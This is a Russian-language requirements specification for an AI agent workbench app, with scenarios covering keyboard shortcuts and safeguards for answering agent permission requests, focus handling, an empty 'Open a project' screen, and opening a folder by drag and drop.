- **Активное одобрение** — самое раннее по `requestedAt` ожидающее одобрение хода активной сессии (признак `focused` модели клиентского ядра, требование «Паттерны взаимодействия agent workbench», сценарий «Клавиатурные approve/reject применяются к самому раннему pending approval»). Признак модели не означает клавиатурного фокуса.
- **Клавиатурный фокус в полосе** — фокус Flutter на самой полосе решения или на элементе внутри неё.

Клавиши Cmd/Ctrl+Enter, Cmd/Ctrl+Alt+Enter, Cmd/Ctrl+Backspace и Cmd/Ctrl+Alt+Backspace НЕ SHALL отвечать на `session/request_permission` ни в одном месте рабочего места, в том числе при фокусе в полосе. Cmd/Ctrl+Enter остаётся отправкой композера. Ответ с клавиатуры даёт только требование «Ответ на одобрение сочетанием с любого места рабочего места» (решение пользователя 2026-11-20).

#### Scenario: Одобрение появилось без фокуса — Cmd/Ctrl+Enter не отвечает
- **WHEN** на рабочем месте фокуса нет ни у одного элемента (пользователь кликнул по пустой ленте), агент присылает `session/request_permission` с четырьмя стандартными вариантами, и пользователь нажимает Cmd+Enter, затем Ctrl+Enter
- **THEN** ответ на `session/request_permission` не отправлен, полоса решения ждёт, а клавиатурный фокус не в полосе

#### Scenario: Одобрение появилось без фокуса — прежние клавиши одобрения не отвечают
- **WHEN** на рабочем месте фокуса нет ни у одного элемента, появляется одобрение с четырьмя стандартными вариантами, и пользователь по очереди нажимает Cmd/Ctrl+Alt+Enter, Cmd/Ctrl+Backspace и Cmd/Ctrl+Alt+Backspace, каждое в варианте Ctrl и в варианте ⌘
- **THEN** ни один вариант не выбран, ответ на `session/request_permission` не отправлен

#### Scenario: Прежние клавиши одобрения не отвечают и при фокусе в полосе
- **WHEN** пользователь перешёл к активному одобрению сочетанием Cmd/Ctrl+Shift+A и нажимает Cmd/Ctrl+Enter, затем Cmd/Ctrl+Backspace
- **THEN** ответ на `session/request_permission` не отправлен, полоса ждёт и остаётся в фокусе

#### Scenario: Одобрение появилось после закрытия палитры
- **WHEN** пользователь закрыл палитру команд по Esc, сразу после этого появляется одобрение, и пользователь нажимает Cmd/Ctrl+Enter
- **THEN** ответ на `session/request_permission` не отправлен, полоса решения ждёт

#### Scenario: Фокус в композере не уходит к одобрению
- **WHEN** фокус в поле композера с текстом `run tests`, появляется одобрение, и пользователь нажимает Cmd/Ctrl+Enter
- **THEN** фокус по-прежнему в композере, сообщение `run tests` поставлено в очередь (требование «Messages queue instead of failing when the session is busy»), а одобрение ждёт

#### Scenario: Фокус в дереве Files или в сайдбаре
- **WHEN** фокус в дереве Files или на строке сайдбара, ждёт одобрение, и пользователь нажимает Cmd/Ctrl+Enter или Cmd/Ctrl+Backspace
- **THEN** ответ на `session/request_permission` не отправлен, сообщение в очередь не поставлено

#### Scenario: Кнопка с фокусом выключается
- **WHEN** фокус на кнопке «Allow» полосы, и пользователь отвечает Space, а пока ответ отправляется, кнопки полосы выключены
- **THEN** фокус на узле той же полосы, а не вне её и не в другой полосе; Enter и Space ничего не отправляют повторно

#### Scenario: Tab до кнопки не самого раннего одобрения
- **WHEN** ждут одобрения `A` (раньше) и `B`, пользователь клавишей Tab ставит фокус на кнопку «Allow» одобрения `B` и нажимает Cmd/Ctrl+Enter
- **THEN** ответ не отправлен ни на `A`, ни на `B`; Enter или Space на этой кнопке отвечают на `B` её вариантом

### Requirement: Ответ на одобрение сочетанием с любого места рабочего места
Рабочее место SHALL предлагать сочетания ответа на активное одобрение, которые действуют без клавиатурного фокуса в полосе — с любого элемента рабочего места, включая поле композера и саму полосу (решение пользователя 2026-11-20, по образцу Zed). Клавиши SHALL зависеть от платформы и привязываться только на своей платформе:

| Вариант | macOS | Windows, Linux |
|---|---|---|
| `allow_once` | ⌘Y | Alt+Shift+Y |
| `allow_always` | ⌥⌘Y | Alt+Shift+Q |
| `reject_once` | ⌥⌘Z | Alt+Shift+X |
| `reject_always` | ⌥⇧⌘Z | Alt+Shift+W |

На macOS Ctrl+Y, Ctrl+Alt+Y и Ctrl+Alt+Z НЕ SHALL отвечать, а ⌘Z и ⇧⌘Z остаются отменой и повтором правки. На Windows и Linux Ctrl+Y, Ctrl+Z, Ctrl+Shift+Z и Cmd-варианты НЕ SHALL отвечать: Ctrl+Z и Ctrl+Shift+Z — отмена и повтор правки в поле композера (`DefaultTextEditingShortcuts`), и они SHALL работать в поле как раньше; Ctrl+Y в поле Flutter не привязан и НЕ SHALL ни отвечать на одобрение, ни менять его, хотя в других приложениях это повтор правки.

Сочетание SHALL действовать, только когда выполнены все условия:
- клавиатурный фокус на рабочем месте или в его элементе, но не в открытом диалоге (в том числе во встроенном диалоге сессии в корне диска), не в палитре команд, не в терминале пользователя и не на экране настроек;
- соединение `Connected`, активная сессия не `detached`;
- у активной сессии есть активное одобрение, и у него есть вариант этого `kind`. Вариант выбирается по `kind`, а не по подписи; варианты неизвестного `kind` сочетаний не получают.

Целью SHALL быть активное одобрение в момент нажатия, вариант — по `kind` этого одобрения. Ответ SHALL уходить с `optionId` этого варианта и id этого запроса; другой запрос, в том числе появившийся после нажатия, НЕ SHALL получать этот ответ.

Компенсирующие меры (ответ на запрос, которого пользователь не видит или не успел увидеть, НЕ SHALL уходить):
- **Видимость.** Если полоса решения цели не видна целиком в области ленты (лента прокручена, строка не построена, ленту закрывает выдвижная панель), нажатие SHALL только прокрутить ленту к полосе и подсветить её, как «Go to approval» панели Agents, без ответа и без переноса фокуса. Следующее нажатие отвечает, если условия выполнены.
- **Задержка после появления.** Если цель стала активным одобрением меньше 500 мс назад, нажатие SHALL только показать полосу, как при невидимой цели, без ответа. Так двойное нажатие после ответа и нажатие, начатое до появления запроса, не отвечают на новый запрос. Отсчёт SHALL начинаться заново, когда нажатие только показало полосу (ответа не было из-за невидимости): ответ уходит не раньше чем через 500 мс после показа, поэтому двойное нажатие сразу после прыжка ленты не отвечает.
- **Автоповтор** клавиши (удержание) НЕ SHALL отвечать.
- **Модификаторы зажаты заранее (Windows и Linux).** Сочетание Alt+Shift+буква SHALL отвечать, только если и Alt, и Shift зажаты не меньше чем за 150 мс до нажатия буквы. Иначе ответа нет: так буква, наложившаяся на смену раскладки Alt+Shift (на русской раскладке «н» — клавиша Y, «й» — Q), не отвечает на запрос (решение пользователя 2026-11-20). На macOS это условие не действует.
- **Ответ в полёте.** Пока предыдущий ответ на это одобрение отправляется, нажатие НЕ SHALL отправлять второй ответ.

После ответа сочетанием фокус SHALL оставаться там, где был, если его узел жив; иначе действует требование «Фокус после ухода одобрения». Каждый ответ с рабочего места SHALL журналироваться событием `workbench.approval_answer` с полями `session_id`, `request_id`, `tool_call_id`, `kind` и `source` (`button` или `shortcut`). Нажатие сочетания без ответа SHALL журналироваться событием `workbench.approval_shortcut_skipped` с полями `session_id`, `request_id` (если цель есть) и `reason`: `not_visible`, `settling`, `modifiers_not_held`, `answer_in_flight`, `no_option`, `no_target`, `palette_open`, `root_dialog`. Сырые аргументы, заголовок и команда вызова в эти события НЕ SHALL попадать.

#### Scenario: Ответ из композера
- **WHEN** платформа — macOS, фокус в поле композера с текстом `draft`, полоса активного одобрения видна и активна дольше 500 мс, и пользователь нажимает ⌘Y
- **THEN** выбран `allow_once` этого одобрения, текст композера по-прежнему `draft`, фокус в композере, в журнале `workbench.approval_answer` с `source: shortcut`

#### Scenario: Ответ на Windows и Linux
- **WHEN** платформа — Linux, полоса активного одобрения видна и активна дольше 500 мс, и пользователь, зажав Alt и Shift заранее, нажимает Q, а для другого одобрения — X
- **THEN** выбраны `allow_always` и `reject_once` соответственно

#### Scenario: Отклонить всегда
- **WHEN** полоса активного одобрения с вариантом `reject_always` видна и активна дольше 500 мс, и пользователь нажимает ⌥⇧⌘Z на macOS, а для другого такого же одобрения на Linux — Alt+Shift+W
- **THEN** выбран `reject_always` соответствующего одобрения

#### Scenario: Отмена и повтор правки на macOS не отвечают
- **WHEN** платформа — macOS, фокус в поле композера, ждёт видимое активное одобрение, и пользователь нажимает ⌘Z, затем ⇧⌘Z
- **THEN** правка поля отменена и повторена, ответ на `session/request_permission` не отправлен

#### Scenario: Повтор правки в композере не отвечает
- **WHEN** платформа — Windows, фокус в поле композера, ждёт видимое активное одобрение, и пользователь нажимает Ctrl+Z, затем Ctrl+Y, затем Ctrl+Shift+Z
- **THEN** правка поля отменена, Ctrl+Y ничего не меняет ни в поле, ни в одобрении, Ctrl+Shift+Z повторяет правку; ответ на `session/request_permission` не отправлен, одобрение ждёт

#### Scenario: Чужие модификаторы не отвечают
- **WHEN** платформа — macOS, ждёт видимое активное одобрение, и пользователь нажимает Ctrl+Y; затем платформа — Linux, и пользователь нажимает Ctrl+Y и Cmd+Y
- **THEN** ответ не отправлен ни в одном случае

#### Scenario: Отправка остаётся отправкой
- **WHEN** фокус в поле композера с текстом `run tests`, ждёт видимое активное одобрение, и пользователь нажимает Cmd/Ctrl+Enter
- **THEN** сообщение `run tests` поставлено в очередь, одобрение ждёт

#### Scenario: Полоса не видна — первое нажатие показывает
- **WHEN** лента прокручена вверх, полоса активного одобрения вне видимой области, и пользователь нажимает ⌘Y
- **THEN** ответ не отправлен, лента прокручена к полосе и полоса подсвечена, фокус прежний, в журнале `workbench.approval_shortcut_skipped` с `reason: not_visible`; повторное ⌘Y выбирает `allow_once`

#### Scenario: Запрос только что появился
- **WHEN** полоса нового одобрения видна, оно стало активным 200 мс назад, и пользователь нажимает ⌘Y
- **THEN** ответ не отправлен, в журнале `reason: settling`; нажатие через 500 мс после появления выбирает `allow_once`

#### Scenario: Нажатие сразу после показа не отвечает
- **WHEN** полоса активного одобрения (активного дольше 500 мс) вне видимой области, пользователь нажимает ⌘Y, лента прокручивается к полосе, и через 100 мс пользователь нажимает ⌘Y снова
- **THEN** второе нажатие не отвечает (`reason: settling`); нажатие через 500 мс после показа выбирает `allow_once`

#### Scenario: Буква наложилась на смену раскладки
- **WHEN** платформа — Windows, ждёт видимое активное одобрение, пользователь переключает раскладку Alt+Shift и в пределах 150 мс после нажатия Alt и Shift нажимает Y (на русской раскладке — «н»)
- **THEN** ответ не отправлен, в журнале `workbench.approval_shortcut_skipped` с `reason: modifiers_not_held`

#### Scenario: Заранее зажатые модификаторы отвечают
- **WHEN** платформа — Linux, ждёт видимое активное одобрение, активное дольше 500 мс, пользователь зажимает Alt и Shift и через 200 мс нажимает Q
- **THEN** выбран `allow_always`

#### Scenario: Нажатие, пока ответ в полёте
- **WHEN** пользователь ответил ⌘Y, и до завершения отправки ответа снова нажимает ⌘Y
- **THEN** второй ответ не отправлен, в журнале `reason: answer_in_flight`

#### Scenario: Двойное нажатие после ответа
- **WHEN** ждут одобрения `A` и `B`, пользователь нажимает ⌘Y, `A` получает `allow_once`, `B` становится активным, и через 100 мс пользователь снова нажимает ⌘Y
- **THEN** `B` ждёт, ответ на `B` не отправлен

#### Scenario: Удержание клавиши
- **WHEN** ждёт видимое активное одобрение, и пользователь удерживает ⌘Y так, что приходят события автоповтора
- **THEN** ответ отправлен ровно один раз, на это одобрение

#### Scenario: Несколько одобрений — ответ самому раннему
- **WHEN** ждут одобрения `A` (раньше по `requestedAt`) и `B`, обе полосы видны и `A` активно дольше 500 мс, и пользователь нажимает ⌥⌘Z
- **THEN** `reject_once` выбран у `A`, `B` ждёт

#### Scenario: Одобрение субагента
- **WHEN** активное одобрение спрашивает субагент, его блок под строкой `agent` корня виден, и пользователь нажимает ⌘Y
- **THEN** выбран `allow_once` этого запроса, строка `agent` корня осталась свёрнутой

#### Scenario: Нет варианта этого вида
- **WHEN** активное одобрение предлагает только `allow_once` и `reject_once`, его полоса видна, и пользователь нажимает ⌥⌘Y
- **THEN** ответ не отправлен, в журнале `reason: no_option`

#### Scenario: Вне рабочего места сочетание не действует
- **WHEN** ждёт видимое активное одобрение, и пользователь нажимает ⌘Y на экране настроек, в открытой палитре команд, в диалоге «Add connection profile», во встроенном диалоге сессии в корне диска и с фокусом в терминале пользователя
- **THEN** ответ не отправлен ни в одном случае; в терминале клавиши получает shell

#### Scenario: Соединение потеряно или сессия detached
- **WHEN** ожидающее одобрение есть, но соединение не `Connected` или активная сессия `detached`, и пользователь нажимает ⌘Y
- **THEN** ответ не отправлен

#### Scenario: Ответ кнопкой журналируется
- **WHEN** пользователь отвечает кнопкой «Allow»
- **THEN** в журнале `workbench.approval_answer` с `source: button`, без сырых аргументов и команды

### Requirement: Переход к ожидающему одобрению с клавиатуры
Рабочее место SHALL предлагать сочетание «Go to approval»: Cmd+Shift+A и Ctrl+Shift+A на всех платформах (основной модификатор каталога `CodeLabShortcut`, запись `goToApproval`). Сочетание нужно, чтобы с клавиатуры прочитать запрос, открыть «View raw input», выбрать охват и ответить кнопкой. Сочетание SHALL действовать на рабочем месте, когда клавиатурный фокус:
- на рабочем месте или в любом его элементе, включая композер;
- не в открытом диалоге и не в палитре команд;
- не на экране настроек.

Сочетание действует, пока у активной сессии есть активное одобрение. Соединение при этом SHALL быть в состоянии `Connected`, а сессия НЕ SHALL быть `detached`.

Нажатие SHALL:
1. выбрать целью активное одобрение активной сессии в момент нажатия. Это и одобрение, которое спрашивает субагент: его блок стоит под строкой `agent` корня (требование «Запрос одобрения от субагента под строкой корня»);
2. прокрутить ленту так, чтобы полоса решения цели была видна. Механизм тот же, что у «Go to approval» панели Agents, и строку `agent` корня он не раскрывает;
3. поставить клавиатурный фокус на саму полосу решения цели, а не на её кнопку.

Полоса с клавиатурным фокусом SHALL:
- НЕ SHALL выбирать вариант по Enter или Space — их нажатие на полосе ничего не отправляет;
- пропускать Tab и Shift+Tab к своим элементам: «Allow», «Reject», выбор охвата, «View raw input».

Сочетания ответа (требование «Ответ на одобрение сочетанием с любого места рабочего места») действуют и при фокусе в полосе, по тем же правилам.

Без активного одобрения в активной сессии нажатие НЕ SHALL ничего делать: фокус и прокрутка прежние, ошибки и заметки нет. Если цель решена, снята или ушла из ленты до того, как получила фокус, фокус SHALL оставаться прежним и НЕ SHALL переходить к другому одобрению. Повторное нажатие, пока фокус уже в полосе цели, НЕ SHALL ничего менять.

Полоса с клавиатурным фокусом SHALL показывать видимую рамку фокуса цветами `FluentTheme`. Рамка отличается от фона не только цветом заливки. Для чтения с экрана полоса SHALL быть контейнером с подписью `Awaiting approval` на языке интерфейса. Подсказка контейнера перечисляет варианты, у которых есть сочетание: название варианта от агента и клавиши словами (`spokenFor` каталога), например `Allow once: Cmd+Y`.

Отдельной подсказки перехода в полосе НЕ SHALL быть: кнопки активного одобрения показывают сочетания ответа, которые действуют с любого места рабочего места.

#### Scenario: Пользователь с клавиатуры доходит до одобрения и отвечает кнопкой
- **WHEN** фокус в композере, ждёт одобрение с четырьмя стандартными вариантами, пользователь нажимает Cmd/Ctrl+Shift+A, Tab до выбора охвата, выбирает «Always», Tab до «Reject» и нажимает Enter
- **THEN** после первого нажатия полоса решения видна и в фокусе с рамкой, ответ не отправлен; в конце выбран `reject_always` этого одобрения

#### Scenario: Переход и сочетание ответа
- **WHEN** платформа — macOS, пользователь перешёл к одобрению, активному дольше 500 мс, сочетанием Cmd/Ctrl+Shift+A и нажимает ⌥⌘Z
- **THEN** выбран вариант `reject_once` этого одобрения

#### Scenario: Enter на полосе ничего не выбирает
- **WHEN** пользователь перешёл к одобрению сочетанием Cmd/Ctrl+Shift+A и нажимает Enter, затем Space
- **THEN** ответ на `session/request_permission` не отправлен, полоса ждёт и остаётся в фокусе

#### Scenario: С клавиатуры через Tab
- **WHEN** пользователь перешёл к одобрению сочетанием Cmd/Ctrl+Shift+A, нажимает Tab до кнопки «Reject» и нажимает Enter
- **THEN** выбран вариант этой кнопки для выбранного охвата (`reject_once` при охвате «Only this time»)

#### Scenario: Несколько одобрений — переход к самому раннему
- **WHEN** в ходе активной сессии ждут одобрения `A` (раньше по `requestedAt`) и `B`, лента прокручена к `B`, и пользователь нажимает Cmd/Ctrl+Shift+A
- **THEN** лента прокручена к `A`, фокус в полосе `A`, а `B` ждёт и фокус не получает

#### Scenario: Одобрение субагента
- **WHEN** активное одобрение спрашивает субагент, и его блок стоит под свёрнутой строкой `agent` корня, а пользователь нажимает Cmd/Ctrl+Shift+A
- **THEN** лента прокручена к блоку «review › explore wants to run», фокус в его полосе, строка `agent` корня осталась свёрнутой

#### Scenario: Ожидающего одобрения нет
- **WHEN** у активной сессии нет ожидающего одобрения, а у фоновой сессии есть, и фокус в композере, и пользователь нажимает Cmd/Ctrl+Shift+A
- **THEN** фокус в композере, активная сессия и прокрутка ленты прежние

#### Scenario: Цель ушла до фокуса
- **WHEN** пользователь нажал Cmd/Ctrl+Shift+A, и до того, как полоса цели получила фокус, ход отменён, а в ленте осталось или появилось другое ожидающее одобрение
- **THEN** фокус прежний, другое одобрение фокус не получило

#### Scenario: Из настроек сочетание не действует
- **WHEN** открыт экран настроек, в активной сессии ждёт одобрение, и пользователь нажимает Cmd/Ctrl+Shift+A
- **THEN** экран настроек остаётся открытым, фокус в настройках, InfoBar `settings-pending-approval` на месте, ответ не отправлен

#### Scenario: Палитра команд открыта
- **WHEN** открыта палитра команд, в активной сессии ждёт одобрение, и пользователь нажимает Cmd/Ctrl+Shift+A
- **THEN** палитра открыта, фокус в её поле поиска, полоса решения фокус не получила

#### Scenario: Подсказки на кнопках активного одобрения
- **WHEN** ждёт одобрение с четырьмя стандартными вариантами, фокус в композере, платформа — macOS, затем Linux
- **THEN** кнопка «Allow» при охвате «Only this time» показывает `⌘Y`, затем `Alt+Shift+Y`; подписи `Press … to answer from the keyboard` нет

#### Scenario: Чтение с экрана
- **WHEN** платформа — macOS, пользователь перешёл к одобрению с вариантами `allow_once` и `reject_once` сочетанием Cmd/Ctrl+Shift+A, и программа чтения с экрана читает элемент в фокусе
- **THEN** подпись элемента — `Awaiting approval` и сочетания словами `Cmd+Y` и `Option+Cmd+Z`, без символов `⌘` и `⌥`

### Requirement: Фокус после ухода одобрения
Если полоса решения исчезает, пока клавиатурный фокус в ней, фокус SHALL переходить в поле композера активной сессии, если композер есть и включён, иначе — на рабочее место. Полоса исчезает, когда:
- пользователь ответил сочетанием или кнопкой;
- ход отменён;
- запрос снят переподключением;
- пользователь переключил сессию.

Узел, которому фокус передал сам Flutter при уходе полосы (ближайшая область, предыдущий узел — например, строка сайдбара), НЕ SHALL считаться выбором пользователя: фокус SHALL переводиться в композер (или на рабочее место). Если этот узел внутри полосы другого одобрения, перевод SHALL происходить сразу, до обработки следующего нажатия. Если же после ухода полосы и до возврата пользователь сам перевёл фокус, возврата НЕ SHALL быть. Следующее ожидающее одобрение, в том числе ставшее активным, НЕ SHALL получать фокус само (требование «Одобрение получает клавиатурный фокус только по действию пользователя»).

Клавиатурный фокус полосы SHALL принадлежать своему запросу (`ApprovalRequestId`). Если на том же месте ленты появляется полоса другого запроса, фокус на неё НЕ SHALL переходить.

#### Scenario: Фокус не остаётся там, куда его отдал Flutter
- **WHEN** фокус был на строке сайдбара, пользователь перешёл к одобрению сочетанием Cmd/Ctrl+Shift+A и ответил кнопкой «Allow» (Tab, Enter)
- **THEN** фокус в поле композера, а не на строке сайдбара

#### Scenario: Пользователь сам перевёл фокус сразу после ответа
- **WHEN** полоса с фокусом ушла после ответа, и до следующего кадра пользователь кликнул в дерево Files
- **THEN** фокус в дереве Files, в композер он не переведён

#### Scenario: Flutter вернул фокус на кнопку другого одобрения
- **WHEN** фокус был на кнопке «Allow» одобрения `B`, пользователь перешёл к активному одобрению `A` сочетанием Cmd/Ctrl+Shift+A и ответил ⌘Y, Flutter отдаёт фокус прежнему узлу — кнопке `B`; `B` становится активным, и пользователь сразу нажимает Enter
- **THEN** фокус в поле композера, нажатие не отвечает на `B`, `B` ждёт

#### Scenario: Ответ сочетанием из полосы возвращает фокус в композер
- **WHEN** пользователь перешёл к одобрению `A` сочетанием Cmd/Ctrl+Shift+A и выбрал `allow_once` сочетанием ⌘Y, а одобрение `B` ещё ждёт
- **THEN** фокус в поле композера, полоса `B` фокуса не получила; повторное Cmd/Ctrl+Enter при пустом композере ничего не отправляет и не отвечает на `B`

#### Scenario: Отмена хода при фокусе в полосе
- **WHEN** фокус в полосе одобрения, и ход отменяется
- **THEN** полоса заменена тегом «Cancelled», фокус в поле композера

#### Scenario: Новый запрос того же вызова
- **WHEN** фокус в полосе одобрения `A`, пользователь ответил на `A`, и агент присылает новый `session/request_permission` для того же вызова
- **THEN** полоса нового запроса показана в той же строке вызова без фокуса, фокус в поле композера

### Requirement: Сочетания app не зависят от раскладки ввода
Каждое сочетание каталога `CodeLabShortcut` с латинской буквой или знаком SHALL срабатывать при нелатинской раскладке ввода (например, русской) так же, как при английской, — как в нативных приложениях. Каталог сравнивает логическую клавишу события; что при нелатинской раскладке и зажатом ⌘ или Ctrl она латинская, обеспечивает Flutter (design.md, D16 — отменённое правило физической позиции и причины отмены). На латинских раскладках (AZERTY, QWERTZ, Dvorak) сочетание SHALL срабатывать по напечатанной букве. Модификаторы сверяются точно. Нажатие буквы без модификаторов, которых требует сочетание, НЕ SHALL срабатывать при любой раскладке. Сочетания ответа на одобрение при нелатинской раскладке SHALL проходить те же условия, что при латинской (требование «Ответ на одобрение сочетанием с любого места рабочего места»), включая удержание Alt и Shift не меньше 150 мс на Windows и Linux. Кейкапы и подсказки показывают латинские клавиши независимо от раскладки.

#### Scenario: Палитра и ответ при русской раскладке macOS
- **WHEN** платформа — macOS, раскладка — русская, и пользователь нажимает ⌘ и клавишу «Л» (K), а при видимом активном одобрении, активном дольше 500 мс, — ⌘ и клавишу «Н» (Y)
- **THEN** открывается палитра команд, затем выбран `allow_once` этого одобрения (проверено вручную на настоящей клавиатуре, задача 8.6)

#### Scenario: Сочетание при русской раскладке Windows и Linux
- **WHEN** платформа — Windows, затем Linux, раскладка — русская, и пользователь нажимает Ctrl и клавишу «Л» (K); при видимом активном одобрении — Alt и Shift с удержанием 200 мс и клавишу «Н» (Y), а затем то же с удержанием 50 мс
- **THEN** открывается палитра команд; в первом случае с одобрением выбран `allow_once`, во втором ответа нет (`reason: modifiers_not_held`). Проверяется вручную: поведение Flutter на этих ОС при русской раскладке в change не проверено

#### Scenario: AZERTY — по напечатанной букве
- **WHEN** платформа — macOS, раскладка — французская AZERTY, видимое активное одобрение активно дольше 500 мс, и пользователь нажимает ⌥⌘ и клавишу, на которой напечатано Z
- **THEN** выбран `reject_once`

#### Scenario: Кириллица без модификаторов не отвечает
- **WHEN** раскладка — русская, фокус в поле композера, ждёт видимое активное одобрение, активное дольше 500 мс, и пользователь набирает «нйлф» без модификаторов
- **THEN** текст набран в поле, ответ на `session/request_permission` не отправлен, палитра не открыта

### Requirement: Экран без выбранного проекта
Если проект не выбран и панель сессии показывает стартовый экран (сессии в фокусе нет, лента пуста, соединение не установлено и не в состоянии сбоя или потери), панель SHALL показывать экран `open-project-screen` по кадру 11a (design.md change `add-empty-project-screen`, D1, D2). Сверху вниз на нём:
1. иконка-герой и заголовок `Open a project`;
2. пояснение, которое зависит от профиля окна (D6):
   - встроенный агент — `Choose the folder you want to work in. The agent starts in it, and sessions get it as their working directory. The agent can't read or write outside it.`;
   - stdio — `Choose the folder you want to work in. The agent starts in it, and sessions get it as their working directory. An external agent applies its own rules to files outside it.`;
   - WebSocket — `Choose the folder you want to work in. Sessions get it as their working directory. An external agent applies its own rules to files outside it.`;
3. кнопка `Open folder…` (ключ `start-open-project`) с подсказкой сочетания Cmd/Ctrl+O для платформы. Кнопка открывает системный выбор папки, как «Open folder…» сайдбара;
4. зона перетаскивания (ключ `open-project-drop-zone`) с текстами `Drop a folder here to open it` и `Files are not accepted — only a folder` (требование «Открытие папки перетаскиванием»);
5. карточка агента окна (ключ `open-project-agent`, D5):
   - имя профиля — та же подпись, что в подсказке бейджа; у встроенного агента — переведённая;
   - строка транспорта: для встроенного агента `in-process · profile of this window`; для stdio `stdio · <command> · profile of this window`, где команда без аргументов; для WebSocket `WebSocket · <scheme>://<host>:<port> · profile of this window`, без userinfo, пути и query;
   - пояснение: для встроенного агента и stdio — `Starts when you open a folder. Nothing runs before that.`; для WebSocket — `Connects when you open a folder. Nothing connects before that.`;
   - ссылка `Change in Settings › Connection` (ключ `open-project-agent-settings`): открывает настройки на странице «Connection» через навигацию app;
6. InfoBar (ключ `open-project-info`) с заголовком `New session needs a folder` и текстом `<shortcut> without a project opens the same folder picker. Opened folders appear in the sidebar as recent projects.` Здесь `<shortcut>` — подсказка сочетания «New session» для платформы: `Ctrl+N` на Windows и Linux, `⌘N` на macOS.

Показ экрана НЕ SHALL запускать агента, открывать транспорт и отправлять агенту сообщения. Экран с выбранным проектом («New session») и экран сбоя старта этим требованием не меняются.

Тексты SHALL браться из каталогов ARB `en` и `ru`. Имя профиля пользователя, команда и адрес показываются как есть. Аргументы stdio, переменные окружения и токен профиля на экране НЕ SHALL показываться. Цвета SHALL браться из темы Fluent и палитры кита: в тёмной теме экран соответствует кадру `ProjectsEmpty-dark`. При нехватке высоты колонка экрана прокручивается, а не переполняется.

#### Scenario: Встроенный агент без проекта
- **WHEN** проект не выбран, недавних проектов нет, профиль окна — встроенный агент, платформа — Linux
- **THEN** панель сессии показывает `open-project-screen`: заголовок `Open a project`, пояснение с фразой `The agent can't read or write outside it.`, кнопку `Open folder…` с подсказкой `Ctrl+O`, зону с `Drop a folder here to open it`, карточку `Embedded agent` с `in-process · profile of this window` и `Starts when you open a folder. Nothing runs before that.`, InfoBar `New session needs a folder` с текстом, начинающимся на `Ctrl+N without a project`; открыватель встроенного агента не вызван, агенту ничего не отправлено

#### Scenario: Профиль stdio
- **WHEN** проект не выбран, и профиль окна — stdio-профиль `dev` с командой `/usr/local/bin/codelab-agent` и аргументами `serve --stdio --token abc`
- **THEN** карточка показывает `dev` и `stdio · /usr/local/bin/codelab-agent · profile of this window`, текста `--token` и `abc` на экране нет, а пояснение заканчивается фразой `An external agent applies its own rules to files outside it.`

#### Scenario: Профиль WebSocket
- **WHEN** проект не выбран, и профиль окна — WebSocket-профиль `remote` с адресом `ws://user:pw@127.0.0.1:8765/acp?t=1`
- **THEN** карточка показывает `WebSocket · ws://127.0.0.1:8765 · profile of this window` и `Connects when you open a folder. Nothing connects before that.`, а пояснение не содержит фразы `The agent starts in it`

#### Scenario: Подсказки на macOS
- **WHEN** проект не выбран, и платформа — macOS
- **THEN** у кнопки `Open folder…` подсказка `⌘O`, а текст InfoBar начинается на `⌘N without a project`

#### Scenario: Ссылка на настройки подключения
- **WHEN** проект не выбран, и пользователь нажимает `Change in Settings › Connection`
- **THEN** открыты настройки на странице «Connection», агент не запущен, агенту ничего не отправлено

#### Scenario: Отмена выбора папки
- **WHEN** проект не выбран, пользователь нажимает `Open folder…` и закрывает системный диалог без выбора
- **THEN** проект не выбран, экран `open-project-screen` по-прежнему показан, агент не запущен

#### Scenario: Проект выбран
- **WHEN** выбран проект `/work/app`, и сессии в фокусе нет
- **THEN** экрана `open-project-screen` и зоны перетаскивания нет, стартовый экран предлагает «New session» (`start-new-session`), как до этого change

#### Scenario: Тёмная тема и низкое окно
- **WHEN** проект не выбран, тема app — тёмная, окно 800×600
- **THEN** экран построен без ошибок переполнения, все шесть блоков доступны прокруткой, цвета текста и рамки зоны взяты из тёмной темы Fluent

### Requirement: Открытие папки перетаскиванием
Экран без выбранного проекта (требование «Экран без выбранного проекта») SHALL принимать элементы, перетащенные из файлового менеджера ОС, в любой точке экрана (design.md change `add-empty-project-screen`, D3, D4). Пока элементы над экраном, зона `open-project-drop-zone` SHALL быть выделена. Выделение снимается, когда элементы покидают экран или брошены. На рабочем месте с выбранным проектом, в настройках и в onboarding приёма перетаскивания этим требованием нет.

Решение о брошенных элементах SHALL принимать application (`SettingsCubit`) по видам путей из порта платформы. Виджет и адаптер плагина только передают список путей.
- **Ровно один элемент с локальным путём, и это существующая папка** (по символическим ссылкам ОС переходит): это выбор проекта, тот же, что выбор этой папки в «Open folder…». Папка становится выбранным проектом и попадает в недавние. Это триггер 1 старта агента профиля окна (требование «Агент стартует сам»): папка проверяется на существование, агент стартует в ней, затем `session/list`. `session/new` НЕ SHALL отправляться. Путь берётся так, как его отдала ОС, без разрешения ссылок, как у «Open folder…». Журнал: `project.drop {outcome: opened, count: 1}`. Проверок сверх вида пути бросок не добавляет: пакет macOS (`.app` и другие каталоги-пакеты) — папка, корень диска принимается так же, как в «Open folder…» (решения пользователя Q5 (а), Q6 (а) 2026-11-22).
- **Отказы.** Причина `not_a_folder` — элемент — обычный файл. `multiple` — элементов больше одного, даже если все они папки. `missing` — пути нет на диске. `unsupported` — у элемента нет локального пути, путь не абсолютный путь файловой системы ОС app (URI со схемой вроде `https://…` или `smb://…`, относительный путь), вид пути другой (устройство, сокет) или проверка вида завершилась ошибкой. Плагин на Linux отдаёт не-файловые URI как «путь», а в них бывают userinfo и токены. Поэтому неабсолютный путь отклоняется до проверки вида, и его текст НЕ SHALL попадать в состояние, на экран, в диагностику и в событие журнала (design.md change `add-empty-project-screen`, D4; ревью итерации 1). При отказе проект НЕ SHALL меняться, агент НЕ SHALL стартовать, агенту НЕ SHALL отправляться сообщения. Зона SHALL показывать текст причины (ключ `open-project-drop-message`, тон `warning`):
  - `not_a_folder` — `That's a file. Drop a folder to open it as a project.`;
  - `multiple` — `Drop one folder at a time.`;
  - `missing` — `The dropped item no longer exists: <path>.`;
  - `unsupported` — `This item can't be opened as a project. Drop a folder from your file system.`

  Текст держится до следующего входа перетаскивания на экран, следующего броска или выбора проекта. Отказ SHALL записываться в диагностику уровня `warning` с источником `project`: `Dropped item rejected (<reason>): <path>.`, для `multiple` — `Dropped items rejected (multiple): <n> items.`, для `unsupported` без локального пути и для неабсолютного пути — `Dropped item rejected (unsupported).` без пути. В журнал SHALL писаться событие `project.drop {outcome: rejected, reason, count}`. Путей и имён в событии нет.
